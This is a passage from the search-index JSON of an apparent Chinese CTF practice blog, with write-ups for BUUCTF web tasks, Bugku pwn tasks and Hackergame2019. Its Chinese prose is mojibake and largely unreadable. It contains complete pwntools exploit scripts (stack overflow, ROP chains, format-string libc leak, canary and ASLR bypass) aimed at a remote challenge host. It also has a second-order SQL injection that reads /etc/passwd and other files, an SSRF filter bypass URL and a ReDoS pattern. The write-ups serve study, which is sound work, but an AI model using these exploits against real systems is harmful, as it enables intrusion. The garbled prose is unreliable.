æ­¤æ—¶ï¼Œuser å­—æ®µå‘åè¯» 24 å­—ç¬¦ï¼Œå…¶å€¼ä¸º \";s:8:\"function\";s:59:\"aï¼Œéšåæ˜¯æˆ‘ä»¬æ§åˆ¶çš„ img å­—æ®µå’Œ dd å­—æ®µï¼ˆæ³¨æ„éœ€æ»¡è¶³é•¿åº¦ä¸º 59ï¼‰ï¼Œ} åçš„å†…å®¹è¢«å¿½ç•¥ã€‚æ­¤æ—¶æˆ‘ä»¬å°±æˆåŠŸæ§åˆ¶äº† imgï¼Œè¯»åˆ°äº† d0g3_f1ag.phpã€‚æ–‡ä»¶å†…å®¹æŒ‡å‘å¦ä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒæ ·æ–¹æ³•è¯»å–å³å¯ã€‚ ","date":"2019-11-29","objectID":"/buu-web/:19:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["Web å®‰å…¨"],"content":"[ç½‘é¼æ¯ 2018]Comment å­˜åœ¨ .git æ³„éœ²ï¼ŒGitHack å‘ç°æ¢å¤çš„æ–‡ä»¶ä¸å…¨ï¼Œç„¶åé€šè¿‡ git log --reflog å‘ç°äº†ä¸€ä¸ª stashed çš„è®°å½•ï¼Œç”¨ git reset --hard xxx å›æ»šåˆ°è¯¥è®°å½•å¾—åˆ°å®Œæ•´ä»£ç ï¼š \u003c?php include \"mysql.php\"; session_start(); if($_SESSION['login'] !='yes'){ header(\"Location: ./login.php\"); die(); } if(isset($_GET['do'])){ switch ($_GET['do']) { case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = \"insert into board set category = '$category', title = '$title', content = '$content'\"; $result = mysql_query($sql); header(\"Location: ./index.php\"); break; case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = \"select category from board where id='$bo_id'\"; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num\u003e0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\"; $result = mysql_query($sql); } header(\"Location: ./comment.php?id=$bo_id\"); break; default: header(\"Location: ./index.php\"); } } else{ header(\"Location: ./index.php\"); } ?\u003e æ’å…¥æ•°æ®æ—¶è¿›è¡Œè½¬ä¹‰ï¼Œä½†è·å– category æ—¶æ²¡æœ‰è½¬ä¹‰ç›´æ¥æ‹¼æ¥åˆ°äº† sql è¯­å¥ä¸­æ‰§è¡Œï¼Œå› æ­¤å¯ä»¥äºŒæ¬¡æ³¨å…¥ã€‚ é¦–å…ˆæ˜¯å‘å¸–ï¼Œè®¾ç½® category ä¸º ', content=user(),/*ï¼Œé‚£ä¹ˆ sql è¯­å¥å˜æˆ insertintoboardsetcategory='',content=user(),/*', title ='1', content ='2' ç„¶åè¯„è®º */#ï¼Œsql è¯­å¥ä¸ºï¼š insertintocommentsetcategory='',content=user(),/*', content ='*/#', bo_id ='1' åˆ™è¯„è®ºå†…å®¹ä¸­å°±ä¼šæ˜¾ç¤ºå½“å‰ç”¨æˆ·ä¸º rootï¼ŒéšåæŸ¥çœ‹ /etc/passwd å‘ç°å­˜åœ¨ www ç”¨æˆ·ï¼Œå†æŸ¥çœ‹ /home/www/.bash_history å‘ç°å­˜åœ¨ .DS_Store æ–‡ä»¶ã€‚ éšåæŸ¥çœ‹ .DS_Store æ–‡ä»¶ï¼š ',content=(select hex(load_file('/tmp/html/.DS_Store'))),/* è§£ç å¾—åˆ° flag æ–‡ä»¶åï¼šflag_8946e1ff1ee3e40f.phpã€‚åŒæ ·æ–¹æ³•è¯»å–å³å¯ã€‚ ","date":"2019-11-29","objectID":"/buu-web/:20:0","tags":["SQLi","æ–‡ä»¶ä¸Šä¼ ","SSRF","ååºåˆ—åŒ–","PHP"],"title":"BUUCTF Web ç»ƒä¹ è®°å½•","uri":"/buu-web/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Pwn å…¥é—¨ã€‚ ","date":"2019-10-29","objectID":"/bugku-pwn/:0:0","tags":["æ ˆæ¼æ´","fsb"],"title":"Bugku Pwn ç»ƒä¹ è®°å½•","uri":"/bugku-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"pwn1 nc ä¸Šå»ç›´æ¥æ‹¿åˆ°äº† shellã€‚ ","date":"2019-10-29","objectID":"/bugku-pwn/:1:0","tags":["æ ˆæ¼æ´","fsb"],"title":"Bugku Pwn ç»ƒä¹ è®°å½•","uri":"/bugku-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"pwn2 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+0h] [rbp-30h] memset(\u0026s, 0, 0x30uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(\"say something?\"); read(0, \u0026s, 0x100uLL); puts(\"oh,that's so boring!\"); return 0; } æœ€ç®€å•çš„æ ˆæº¢å‡ºï¼ŒIDA ä¸­å¯ä»¥å‘ç°ç›®æ ‡å‡½æ•° get_shell_ï¼Œåœ°å€ä¸º 0x400751ã€‚s ä½äº ebp-0x30ï¼Œä¸è¦è¦†ç›–çš„è¿”å›åœ°å€ç›¸å·® 0x38ï¼ˆæ³¨æ„æ˜¯ 64 ä½ç¨‹åºï¼‰ï¼Œé‚£ payload å°±æ˜¯ 'a'*0x38 + p64(0x400751)ã€‚ from pwn import * p = remote('114.116.54.89', 10003) payload = 'a'*0x38 +p64(0x400751) p.recvline() p.sendline(payload) p.interactive() ","date":"2019-10-29","objectID":"/bugku-pwn/:2:0","tags":["æ ˆæ¼æ´","fsb"],"title":"Bugku Pwn ç»ƒä¹ è®°å½•","uri":"/bugku-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"pwn4 å’Œ pwn2 çš„åŒºåˆ«æ˜¯æ²¡æœ‰ç°æˆçš„ get_shell å‡½æ•°äº†ï¼Œchecksec å‘ç°ä»€ä¹ˆä¿æŠ¤ä¹Ÿç±³æœ‰ï¼Œä¼°è®¡æ˜¯å†™ shellcodeã€‚ __int64 __fastcall main(__int64 a1, char **a2, char **a3) { char s; // [rsp+0h] [rbp-10h] memset(\u0026s, 0, 0x10uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(\"Come on,try to pwn me\"); read(0, \u0026s, 0x30uLL); puts(\"So~sad,you are fail\"); return 0LL; } ä½†æ˜¯å¡«å……éœ€è¦ 0x18 å­—èŠ‚ï¼Œèƒ½è¾“å…¥çš„åªæœ‰ 0x30 å­—èŠ‚ï¼Œæ²¡æœ‰è¶³å¤Ÿé•¿åº¦å†™ shellcodeï¼Œå› æ­¤è¿™ä¸ªåŠæ³•è¡Œä¸é€šã€‚ IDA ä¸­æµè§ˆä¸‹å‡½æ•°ï¼Œå‘ç°æœ‰ä¸ªå¥‡æ€ªçš„å‡½æ•°ï¼š int sub_400751() { return system(\"ok~you find me,but you can't get my shell'\"); } è¿™é‡Œç»™äº† system å‡½æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦è®©ä»–çš„å‚æ•°ä¸º /bin/sh å°±è¡Œäº†ã€‚æˆ‘ä»¬æœç´¢ä¸‹å­—ç¬¦ä¸²ï¼š å›¾ 1 \" å›¾ 1 è¿™é‡Œæœ‰ä¸€å †æ²¡æœ‰æ„ä¹‰ä½†æ˜¾ç„¶æ˜¯äººä¸ºæ·»åŠ çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥çŒœæƒ³æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿è‚¯å®šåœ¨é‡Œé¢ã€‚è§‚å¯Ÿåˆ°å…¶ä¸­ä¸€ä¸ªå­—ç¬¦ä¸²æœ«å°¾æ˜¯ $0ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ shell çš„åˆ«åäº†ã€‚ å…ˆå®šä½ call _system çš„åœ°å€ 0x40075aï¼Œéšåéœ€è¦åœ¨ 64 ä½ä¸‹ä¼ å‚ï¼Œä¹Ÿå°±æ˜¯éœ€è¦ pop rdi; ret è¿™æ ·çš„ gadgetï¼Œæœ€åè¦å®šä½ $0 çš„ä½ç½®ï¼š $ ROPgadget --binary pwn4 --only 'pop|ret' $ ROPgadget --binary pwn4 --string '\\$0' å¾—åˆ° pop rdi; ret çš„åœ°å€ 0x4007d3 å’Œ $0 çš„åœ°å€ 0x60111fã€‚ from pwn import * context(arch='amd64', os='linux') p = remote('114.116.54.89', 10004) payload = 'a'*0x18 + p64(0x4007d3) + p64(0x60111f) + p64(0x40075a) p.recvline() p.sendline(payload) p.interactive() ","date":"2019-10-29","objectID":"/bugku-pwn/:3:0","tags":["æ ˆæ¼æ´","fsb"],"title":"Bugku Pwn ç»ƒä¹ è®°å½•","uri":"/bugku-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"pwn5 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+0h] [rbp-20h] setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); memset(\u0026s, 0, 0x20uLL); puts(\u0026::s); read(0, \u0026s, 8uLL); printf(\u0026s, \u0026s); puts(\u0026s); puts(\u0026s); puts(\u0026s); puts(\u0026byte_400978); sleep(1u); puts(asc_400998); read(0, \u0026s, 0x40uLL); if (!strstr(\u0026s, \u0026needle) || !strstr(\u0026s, \u0026byte_4009BA) ) { puts(\u0026byte_4009C8); exit(0); } puts(\u0026byte_4009F8); return 0; } æ³¨æ„åˆ° printf(\u0026s, \u0026s);ï¼Œè¯´æ˜è¿™é‡Œæœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚é€šè¿‡ gdb è°ƒè¯•åå‘ç°ï¼Œæˆ‘ä»¬å¯ä»¥æ³„éœ² __libc_start_main åœ°å€æ¥å¾—åˆ° system å’Œ /bin/sh çš„åœ°å€ã€‚ å›¾ 2 \" å›¾ 2 è€Œ __libc_start_main å’Œæˆ‘ä»¬çš„è¾“å…¥åœ¨æ ˆä¸Šç›¸å·® 0x28ï¼Œæ¢ç®—æˆåç§»é‡å°±æ˜¯ 0x28 / 8 = 0x05ï¼Œæ­¤å¤–è¿˜éœ€è¦è€ƒè™‘ 64 ä½ä¸‹çš„å…­ä¸ªä¼ å‚å¯„å­˜å™¨ï¼Œå› æ­¤æ€»åç§»ä¸º 0xbã€‚æˆ‘ä»¬è¾“å…¥ %11$p å³å¯æ³„éœ² __libc_start_main åœ°å€ 0x7ffff7a2d830ã€‚ æ¥ä¸‹æ¥å°±äº¤ç»™ libc_database å·¥å…·äº†ï¼š $ ./find __libc_start_main_ret 830 ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) archive-glibc (id libc6_2.23-0ubuntu3_amd64) $ ./dump libc6_2.23-0ubuntu10_amd64 offset___libc_start_main_ret = 0x20830 offset_system = 0x0000000000045390 offset_dup2 = 0x00000000000f7970 offset_read = 0x00000000000f7250 offset_write = 0x00000000000f72b0 offset_str_bin_sh = 0x18cd57 éšåæˆ‘ä»¬ç”¨å’Œ pwn4 ç›¸åŒçš„æ–¹æ³•æ‰¾åˆ° pop rdi; ret çš„ gadget åœ°å€ 0x400933 å°±å¯ä»¥ç”¨ç±»ä¼¼çš„åŠæ³•æ„é€  payload äº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¨‹åºä¸­è¿˜é™åˆ¶äº†ç¬¬äºŒæ¬¡è¾“å…¥çš„å­—ç¬¦ä¸²å¿…é¡»åŒ…å« é¸½å­ å’Œ çœŸé¦™ ä¸¤ä¸ªå­ä¸²ã€‚ æœ€åçš„ payloadï¼š # coding:utf-8 from pwn import * context(arch='amd64', os='linux', log_level='DEBUG') p = remote('114.116.54.89', 10005) #p=process('./human') p.recvline() p.recvline() p.sendline('%11$p') libc_leak = int(p.recvuntil('\\n')[2:-1], 16) offset___libc_start_main_ret = 0x20830 offset_system = 0x0000000000045390 offset_str_bin_sh = 0x18cd57 base = libc_leak - offset___libc_start_main_ret system_addr = base + offset_system binsh_addr = base + offset_str_bin_sh pop_rdi = 0x400933 payload = 'é¸½å­çœŸé¦™'.ljust(0x28,'a') payload += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) p.recvuntil('?\\n') p.sendline(payload) p.interactive() ","date":"2019-10-29","objectID":"/bugku-pwn/:4:0","tags":["æ ˆæ¼æ´","fsb"],"title":"Bugku Pwn ç»ƒä¹ è®°å½•","uri":"/bugku-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"pwn3 æœ¬é¢˜ vuln å‡½æ•°å…³é”®ä»£ç ï¼š puts(\"write some note:\"); puts(\" please input the note len:\"); note_len = 0; __isoc99_scanf(\"%d\", \u0026note_len); puts(\"please input the note:\"); read(0, thinking_note, (unsigned int)note_len); puts(\"the note is:\"); puts(thinking_note); if (strlen(thinking_note) != 624 ) { puts(\"error: the note len must be 624\"); puts(\" so please input note(len is 624)\"); read(0, thinking_note, 0x270uLL); } åˆ†æ vul å‡½æ•°å¯çŸ¥ï¼Œread å¤„å¯ä»¥æ ˆæº¢å‡ºï¼Œä¸”é•¿åº¦ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚ç¬¬äºŒæ¬¡ read æ—¶é™åˆ¶äº†é•¿åº¦æœ€å¤§ä¸º 0x270ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„ thinking_note è·ç¦» ebp æ˜¯ 0x260 ä¹Ÿå°±æ˜¯ 608 å­—èŠ‚ã€‚ æœ¬é¢˜å¼€å¯äº† canary ä¿æŠ¤ï¼Œå› æ­¤é¦–å…ˆéœ€è¦æ³„éœ² canaryï¼Œcanary ä½äº ebp-0x8 ä½ç½®ã€‚æ³„éœ²å®Œåè¦è¿”å›åˆ° mainï¼Œä½†æ˜¯å¼€å¯äº† ASLR å¯¼è‡´æˆ‘ä»¬æ— æ³•ç¡®å®š main çš„ä½ç½®ã€‚ç„¶è€Œï¼ŒASLR ä¸ä¼šéšæœºåŒ–ä½ 12 ä½ã€‚æˆ‘ä»¬è§‚å¯Ÿ IDA å‘ç° vul å‡½æ•°è¿”å›åˆ° 0xd2e è€Œ main ä½äº 0xd20ï¼Œå› æ­¤åªéœ€è¦è¦†ç›– 2e ä¸º 20 å³å¯ï¼Œä¸å— ASLR å½±å“ã€‚ def ret2main(): payload = flat('a'*600,canary,'a'*8,'\\x20') p.sendafter('624)\\n', payload) def send(payload): p.sendlineafter('path:\\n','flag') p.sendlineafter('len:\\n','999') p.sendlineafter('note:\\n',payload) p.recvuntil('aaaa\\n') # leak canary send('a'*600) canary = u64('\\x00' + p.recv(7)) log.success('canary:' + hex(canary)) ret2main() æ³¨æ„è¿™é‡Œè¦†ç›–çš„æ˜¯ canary çš„ä½ä½å­—èŠ‚ï¼Œæ¢å¤æ—¶éœ€è¦æ³¨æ„é»˜è®¤çš„å°ç«¯æ³•è¡¨ç¤ºã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦æ³„éœ²ç¨‹åºåŸºå€ä»¥ç»•è¿‡ ASLRã€‚è¿™é‡Œå¯ä»¥æ³„éœ² vul å‡½æ•°è¿”å›åœ°å€ï¼Œå‡å»å…¶åç§»é‡ 0xd2e æ¥å¾—åˆ°ã€‚ # leak elf base send('a'*615) base = u64(p.recv(6).ljust(8,'\\x00')) - 0xd2e log.success('base:' + hex(base)) ret2main() å‘é€ 'a'*615 åŠ ä¸Šæœ€åçš„å›è½¦å®é™…ä¸Šæ˜¯ 616 å­—èŠ‚ï¼Œæ°å¥½è¦†ç›–äº† canary å’Œ saved ebpï¼Œæ¥ä¸‹æ¥æ‰“å°çš„å°±æ˜¯è¿”å›åœ°å€ã€‚è¿™ä¸€æ­¥åšå®Œåç”¨åŒæ ·çš„åŠæ³•è¿”å› mainã€‚ ç¬¬ä¸‰æ¬¡ï¼Œæˆ‘ä»¬å·²ç»ç»•è¿‡ canary å’Œ ASLRï¼Œéœ€è¦æ³„éœ² libc åœ°å€ï¼Œç”±äºè¿™é‡Œæœ‰ puts å‡½æ•°ï¼Œç›´æ¥æŒ‰ç…§å¸¸è§„çš„ ret2libc æ–¹æ³•å³å¯ã€‚è¿™é‡Œé‡‡ç”¨äº†æ³„éœ² read å‡½æ•° GOT åœ°å€çš„æ–¹æ³•ã€‚ def ret2libc(leak, func): libc = LibcSearcher(func, leak) base = leak - libc.dump(func) system = base + libc.dump('system') binsh = base + libc.dump('str_bin_sh') return (system, binsh) # leak libc pop_rdi = 0xe03 main = 0xd20 payload = flat(['a'*600,canary,'a'*8,base+pop_rdi,base+elf.got['read'],base+elf.plt['puts'],base+main]) send(payload) payload = flat('a'*600,canary,'a'*8,base+pop_rdi) p.recvuntil('624)\\n') p.send(payload) read = u64(p.recv(6).ljust(8,'\\x00')) log.success('read:' + hex(read)) system, binsh = ret2libc(read,'read') å°¤å…¶éœ€è¦æ³¨æ„ï¼Œç¬¬äºŒæ¬¡è¾“å…¥é•¿åº¦ä¸èƒ½è¶…è¿‡ 0x270 ä¹Ÿå°±æ˜¯ 624ï¼Œè¿™é‡Œæ„é€ çš„ payload æ°å¥½é•¿åº¦ä¸º 624ï¼Œå› æ­¤åªèƒ½ç”¨ p.send() ä¸èƒ½ p.sendline()ï¼Œå¦åˆ™ä¼šå¤šå‡ºä¸€ä¸ª 0a å­—èŠ‚ä½¿ç¨‹åºç»ˆæ­¢ã€‚ æœ€åå°±å¯ä»¥ getshell äº†ï¼š # get shell payload = flat('a'*600,canary,'a'*8,base+pop_rdi,binsh,system) send(payload) p.sendlineafter('624)\\n','a') p.interactive() ","date":"2019-10-29","objectID":"/bugku-pwn/:5:0","tags":["æ ˆæ¼æ´","fsb"],"title":"Bugku Pwn ç»ƒä¹ è®°å½•","uri":"/bugku-pwn/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"å¼€æ‹“çœ¼ç•Œäº†ã€‚ ","date":"2019-10-15","objectID":"/hackergame2019/:0:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"ç­¾åˆ°é¢˜ è¾“å…¥ tokenï¼ŒF12 ä¿®æ”¹ button å±æ€§ï¼Œåˆ æ‰ disabled=\"disabled\" å³å¯ã€‚ ","date":"2019-10-15","objectID":"/hackergame2019/:1:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"ç™½ä¸å¤œ ä¸‹è½½å›¾ç‰‡ç›´æ¥å¾— flagï¼Œä»¥å‰è§è¿‡è¿™ç±»é¢˜ï¼Œå›¾ç‰‡ä¼šåœ¨ä¸åŒèƒŒæ™¯ä¸‹æ˜¾ç¤ºä¸åŒå›¾åƒï¼Œæ‰€ä»¥æ”¹ç½‘é¡µèƒŒæ™¯åº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ï¼ˆæ‰€ä»¥ç›´æ¥å¾—åˆ° flag çš„åŸå› å¯èƒ½æ˜¯å› ä¸ºæˆ‘çš„ç³»ç»Ÿä¸»é¢˜æ˜¯é»‘è‰²çš„ï¼‰ ","date":"2019-10-15","objectID":"/hackergame2019/:2:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"ä¿¡æ¯å®‰å…¨ 2077 F12 æŸ¥çœ‹æºç ï¼Œå‘ç°éœ€è¦ç‰¹å®šçš„ UA å’Œ If-Unmodified-Since è¯·æ±‚å¤´ï¼Œå› æ­¤å…ˆè®¾å®šå¥½ UAï¼Œç„¶ååˆ©ç”¨ js ç”Ÿæˆä¸€ä¸ª 2077 å¹´ 12 æœˆçš„æ—¶é—´ï¼Œä»¿ç…§é¢˜ç›®è¿›è¡Œ toUTCString è½¬æ¢å°±æ˜¯éœ€è¦çš„ If-Unmodified-Since å¤´ï¼Œæœ€å POST å³å¯ã€‚ ","date":"2019-10-15","objectID":"/hackergame2019/:3:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"å®‡å®™ç»ˆæé—®é¢˜ ","date":"2019-10-15","objectID":"/hackergame2019/:4:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"42 å‚è€ƒé“¾æ¥ è¿™ä¹Ÿå¤ªæ–°äº†ã€‚ -80538738812075974 80435758145817515 12602123297335631 ","date":"2019-10-15","objectID":"/hackergame2019/:4:1","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Everything åˆè¦é  ç¥ä»™ç½‘ç«™ æ•‘å‘½äº†ã€‚ ","date":"2019-10-15","objectID":"/hackergame2019/:4:2","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"ç½‘é¡µè¯»å–å™¨ from flask import Flask, render_template, request, send_from_directory import requests # well, requests is designed for humans, and I like it. app = Flask(__name__) whitelist_hostname = [\"example.com\", \"www.example.com\"] whitelist_scheme = [\"http://\"] def check_hostname(url): for i in whitelist_scheme: if url.startswith(i): url = url[len(i):] # strip scheme url = url[url.find(\"@\") + 1:] # strip userinfo if not url.find(\"/\") == -1: url = url[:url.find(\"/\")] # strip parts after authority if not url.find(\":\") == -1: url = url[:url.find(\":\")] # strip port if url not in whitelist_hostname: return (False,\"hostname {}not in whitelist\".format(url)) return (True,\"ok\") return (False,\"scheme not in whitelist, only {}allowed\".format(whitelist_scheme)) @app.route(\"/\") def index(): return render_template(\"index.html\") @app.route(\"/request\") def req_route(): url = request.args.get('url') status, msg = check_hostname(url) if status is False: # print(msg) return msg try: r = requests.get(url, timeout=2) if not r.status_code == 200: return \"We tried accessing your url, but it does not return HTTP 200. Instead, it returns {}.\".format(r.status_code) return r.text except requests.Timeout: return \"We tried our best, but it just timeout.\" except requests.RequestException: return \"While accessing your url, an exception occurred. There may be a problem with your url.\" @app.route(\"/source\") def get_source(): return send_from_directory(\"/static/\", \"app.py\", as_attachment=True) if __name__ == '__main__': app.run(\"0.0.0.0\", 8000, debug=False) ç»è¿‡å°è¯•ï¼Œå¸¸è§„ SSRF æ‰‹æ®µç»•ä¸è¿‡è¿™ä¸ªè¿‡æ»¤å™¨ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰å¯¹ # è¿›è¡Œå¤„ç†ï¼Œå¯ä»¥æ„é€  http://web1/flag#@example.com ä½¿å¾—è¿‡æ»¤å™¨ç›´æ¥å¿½ç•¥ @ å‰çš„å†…å®¹ï¼Œæ­¤æ—¶å†è¿›è¡Œè¯·æ±‚ï¼Œåˆ™ @example.com å°±ä¼šè¢«è§£é‡Šä¸º fragment äº†ã€‚ ","date":"2019-10-15","objectID":"/hackergame2019/:5:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"è¾¾æ‹‰å´©å§å¤§å†’é™© ä¸€ç›´ä»¥ä¸ºæ˜¯è¦å¯¹ websocket åšæ‰‹è„šï¼Œå®é™…ä¸Šå¹¶ä¸èƒ½æˆåŠŸã€‚è¿™é‡Œæˆ‘ä»¬æå‡æ”»å‡»åŠ›çš„å”¯ä¸€é€”å¾„å°±æ˜¯å»ä¹°é¸¡åƒï¼Œæˆ‘ä»¬åœ¨ä¹°é¸¡çš„æ—¶å€™ F12 ä¸€ä¸‹ï¼š å›¾ 1 \" å›¾ 1 å‘ç°è¿™é‡Œçš„ option çš„ value æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼Œå†çœ‹ js ä»£ç ï¼š å›¾ 2 \" å›¾ 2 è¿™é‡Œç›´æ¥å°† option çš„ value å¡«è¿›å»äº†ï¼Œå¹¶æ²¡æœ‰æ£€éªŒå…¶åˆæ³•æ€§ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¿™ä¸ª value ä½¿å¾—å…¶å˜æˆä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œä½†æ˜¯è¿™ä¼šå¯¼è‡´æˆ‘ä»¬é’±ä¸å¤Ÿä¹°ä¸äº†ã€‚ å°†ä¸€ä¸ªæ•°å˜å¾—å¾ˆå¤§ï¼Œé™¤äº†å¢åŠ å®ƒçš„å€¼ï¼Œè¿˜å¯ä»¥å°†å®ƒå‡å°‘æˆä¸€ä¸ªéå¸¸å°çš„è´Ÿæ•°ï¼Œæœ€ç»ˆå¯¼è‡´æº¢å‡ºï¼Œè¿™é‡Œå°±æ˜¯ç”¨çš„ç¬¬äºŒç§æ–¹æ³•ã€‚ 8 å­—èŠ‚èƒ½æ„æˆçš„æœ€å°çš„æ•´æ•°æ˜¯ -9223372036854775808ã€‚é‚£ä¹ˆæˆ‘ä»¬å…ˆä¹° -9223372036854775808 åªé¸¡ï¼Œå†ä¹° -1 åªé¸¡ï¼Œæˆ‘ä»¬çš„æ”»å‡»åŠ›å°±ä¼šå˜æˆä¸€ä¸ªéå¸¸å¤§çš„æ•° 9223372036854776000ã€‚ ","date":"2019-10-15","objectID":"/hackergame2019/:6:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Happy LUG æŸ¥ä¸€ä¸‹èµ„æ–™å¯ä»¥å‘ç°è¿™æ˜¯ PunyCodeï¼Œé¢˜ç›®ä¸­çš„ emoji è¡¨æƒ…ä¼šè¢«ç¼–ç ä¸º xn--g28hï¼Œå› æ­¤çœŸå®åŸŸåæ˜¯ xn--g28h.hack.ustclug.orgã€‚è¿™ä¸ªåŸŸåæ— æ³•é€šè¿‡æµè§ˆå™¨è®¿é—®ï¼Œä½†æ˜¯å´å­˜åœ¨ï¼Œè¯´æ˜ä¸€å®šå­˜åœ¨ä¸€æ¡å¯¹åº”çš„ DNS è®°å½•ï¼Œæˆ‘ä»¬ç”¨ nslookup æŸ¥ä¸€ä¸‹ï¼š $ nslookup -qt=ANY xn--g28h.hack.ustclug.org 8.8.8.8 å°±å¯ä»¥å¾—åˆ° flagã€‚æ³¨æ„åˆ°è¿”å›çš„æ˜¯ â€œéæƒå¨è®°å½•â€ï¼Œè¿™æ˜¯ç”±äº ANY ç±»å‹è®°å½• å·²ç»è¢«åºŸå¼ƒäº†ã€‚ ","date":"2019-10-15","objectID":"/hackergame2019/:7:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"æ­£åˆ™éªŒè¯å™¨ è¿™äº›é¢˜ç›®çœŸçš„ å¤ªæ–°äº†ã€‚ é¢˜ç›®é™åˆ¶äº†æ­£åˆ™é•¿åº¦ä¸è¶…è¿‡ 6ï¼Œå­—ç¬¦ä¸²é•¿åº¦ä¸è¶…è¿‡ 24ï¼Œè¦æ±‚æ„é€ ä¸€ä¸ªè¿è¡Œæ—¶é—´å¤§äº 1 ç§’çš„æ­£åˆ™ã€‚å®é™…ä¸Šå°±æ˜¯ ReDos æ”»å‡»ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥å€Ÿç”¨ wiki ä¸Šçš„ä¾‹å­ï¼š (a+)+$ aaaaaaaaaaaaaaaaaaaaaaab 